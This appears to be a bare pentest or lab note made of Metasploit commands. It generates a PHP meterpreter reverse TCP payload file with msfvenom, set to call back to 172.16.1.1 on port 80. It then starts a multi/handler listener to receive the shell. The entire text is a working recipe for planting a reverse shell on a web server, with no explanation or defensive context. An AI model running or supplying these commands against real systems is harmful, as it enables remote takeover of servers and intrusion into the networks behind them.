
msfvenom -p php/meterpreter/reverse_tcp lhost=172.16.1.1 lport=80 RAW > Rever.php

Use exploit multi/handler
set lhost 172.16.1.1
set lport 80
set payload php/meterpreter/reverse_tcp
run
